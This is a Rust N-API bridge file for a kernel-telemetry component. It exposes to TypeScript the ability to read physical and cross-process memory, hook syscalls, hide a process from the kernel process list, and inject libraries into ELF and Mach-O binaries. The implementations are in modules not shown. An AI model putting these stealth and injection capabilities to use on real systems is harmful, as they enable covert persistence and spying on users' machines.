// N-API entry point for the REA kernel bridge.
//
// Kernel telemetry (Windows driver, macOS EndpointSecurity, Linux eBPF
// ring buffers) is received on native Rust threads and streamed to
// TypeScript through a ThreadsafeFunction (TSFN), so the Node.js event
// loop is never blocked. `NativeKernelBridge` and `NativeBinaryPatcher`
// are the exact classes the TypeScript side (`src/rea/kernel-bridge.ts`)
// expects; keep their method names in sync with that file.
mod binary_patcher;
mod platform;

use napi::bindgen_prelude::*;
use napi::threadsafe_function::{ErrorStrategy, ThreadsafeFunction, ThreadsafeFunctionCallMode};
use napi_derive::napi;
use parking_lot::Mutex;
use platform::{create_platform_backend, KernelBackend, SyscallEventPayload};
use std::sync::Arc;

#[napi]
pub struct NativeKernelBridge {
    backend: Arc<Mutex<Box<dyn KernelBackend>>>,
}

#[napi]
impl NativeKernelBridge {
    #[napi(constructor)]
    pub fn new() -> Self {
        Self {
            backend: Arc::new(Mutex::new(create_platform_backend())),
        }
    }

    #[napi]
    pub fn init_driver_connection(&self, _platform: String, driver_path: Option<String>) -> Result<bool> {
        self.backend.lock().connect(driver_path)
    }

    #[napi]
    pub fn read_physical_memory(&self, phys_addr: BigInt, size: u32) -> Result<Buffer> {
        let (_, addr_u64, _) = phys_addr.get_u64();
        let data = self
            .backend
            .lock()
            .read_physical_memory(addr_u64, size as usize)?;
        Ok(Buffer::from(data))
    }

    #[napi]
    pub fn read_process_virtual_memory(&self, pid: u32, v_addr: BigInt, size: u32) -> Result<Buffer> {
        let (_, addr_u64, _) = v_addr.get_u64();
        let data = self
            .backend
            .lock()
            .read_virtual_memory(pid, addr_u64, size as usize)?;
        Ok(Buffer::from(data))
    }

    #[napi(ts_args_type = "syscallName: string, callback: (event: SyscallEventPayload) => void")]
    pub fn install_syscall_hook(&self, syscall_name: String, callback: JsFunction) -> Result<u32> {
        let tsfn: ThreadsafeFunction<SyscallEventPayload, ErrorStrategy::Fatal> =
            callback.create_threadsafe_function(0, |ctx| Ok(vec![ctx.value]))?;

        let rust_cb = Arc::new(move |payload: SyscallEventPayload| {
            tsfn.call(payload, ThreadsafeFunctionCallMode::NonBlocking);
        });

        self.backend
            .lock()
            .register_syscall_hook(syscall_name, rust_cb)
    }

    #[napi]
    pub fn hide_process_from_kernel_list(&self, pid: u32) -> Result<bool> {
        self.backend.lock().set_pid_visibility_mask(pid, true)
    }
}

#[napi]
pub struct NativeBinaryPatcher;

#[napi]
impl NativeBinaryPatcher {
    #[napi(constructor)]
    pub fn new() -> Self {
        Self
    }

    #[napi]
    pub fn inject_elf_needed(&self, elf_path: String, library_name: String) -> Result<()> {
        binary_patcher::inject_elf_dt_needed(&elf_path, &library_name)
    }

    #[napi]
    pub fn inject_macho_dylib(&self, macho_path: String, dylib_install_name: String) -> Result<()> {
        binary_patcher::inject_macho_load_dylib(&macho_path, &dylib_install_name)
    }
}
